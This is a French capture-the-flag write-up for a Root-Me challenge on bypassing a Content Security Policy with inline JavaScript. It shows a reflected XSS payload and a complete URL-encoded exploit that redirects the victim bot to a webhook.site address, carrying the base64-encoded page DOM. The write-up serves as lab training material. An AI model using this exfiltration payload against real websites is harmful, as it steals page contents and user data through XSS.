# Writeup -- CSP Bypass - Inline code

## Catégorie

Web - Client

## Énoncé

Exfiltrez le contenu de la page

## Choses à savoir 

Une CSP (Content Security Policy), c’est une barrière de sécurité que les sites web mettent en place pour empêcher les attaques XSS.

En gros, c’est comme un pare-feu du navigateur qui dit :
- quelles sources de scripts sont autorisées,
- si on peut exécuter du JavaScript inline ou non,
- si on peut charger des images depuis ailleurs, etc.

## Exploitation

On cherche le flag, que le bot détient.

En arrivant sur la page du challenge, on peut entrer un nom. Lorsqu'on entre un nom au hasard on voit deux choses :
```
http://challenge01.root-me.org:58008/page?user=test
```

<img width="1031" height="404" alt="image" src="https://github.com/user-attachments/assets/befb5067-018b-4182-8bdc-764fc7532df7" />

On voit que le nom entré est inscrit dans l'URL, ainsi que sur la page.

On peut essayer d'injecter un payload XSS : `<img%20src=x%20onerror=alert(1)>`

- Lorsqu'on l'écrit depuis la page, rien ne se passe.
- Si on l'entre depuis l'URL directement, le payload fonctionne :
- 
<img width="1085" height="240" alt="image" src="https://github.com/user-attachments/assets/68626ed8-b4a3-4352-888f-e9f013be4479" />

Il y a donc un problème dans la CSP. On peut essayer de vérifier ça :

<img width="1848" height="219" alt="image" src="https://github.com/user-attachments/assets/ef493541-5d5d-4554-8da2-0ffa49cd1f6d" />

On peut récupérer dans l'inspection toute la CSP.

On remarque dans cette CSP 3 lignes critiques :

- `script-src 'unsafe-inline'` : On peut exécuter du JS inline (JS dans le HTML directement)
- `connect-src 'none'` : Aucune requête réseau n’est autorisée par JS (fetch, XHR, WebSocket etc)
- `img-src 'self'` : On ne peut pas charger une image externe

Les redirections HTTP ne sont pas bloquées, on peut donc utiliser document.location pour renvoyer vers notre webhook

### Création du Payload

On crée notre payload pour récupérer le flag, stocké dans le DOM et visible seulement par le bot.

```
http://challenge01.root-me.org:58008/page?user=%3Cimg%20src%3Dx%20onerror%3D%22document.location%3D'//webhook.site/2f1ce09f-e12d-4fad-8fa8-ca1af01da4cd%3Fd%3D'%2Bbtoa(document.documentElement.outerHTML)%22%3E
``` 
Voici le payload complet, je l'explique ci-dessous :

- `<img src=x onerror="...">` : C'est la façon la plus simple de déclencher un event JS
- `document.location="..."` : La CSP contient connect-src 'none' donc seules les redirections HTTP sont autorisées, document.location nous permet ça
- `//webhook...` : Toute cette partie est simplement mon serveur HTTP, qui permet de recevoir les requêtes, on veut envoyer le bot sur ce lien avec les informations qui nous intéressent, et le // correspond juste au https://
- `btoa(document.documentElement.outerHTML)` : on veut récupérer document.documentElement.outerHTML, qui est la racine du dom, ce qui contient tout le html visible par le bot. La méthode BTOA permet simplement d'encoder en base64, pour que les balises html présentes dans document.do... ne cassent pas la requête.
- On encode tout le payload en URL pour que les balises HTML, les guillemets etc ne cassent pas la requête
  
En envoyant ce lien dans la page report, on reçoit tout le document.documentElement.outerHTML en requête sur notre webhook :

<img width="1096" height="469" alt="image" src="https://github.com/user-attachments/assets/f3869f0c-8504-4b50-b68f-648cb07838b5" />

Il suffit simplement de décoder la base64 pour retrouver le flag, et valider le challenge.

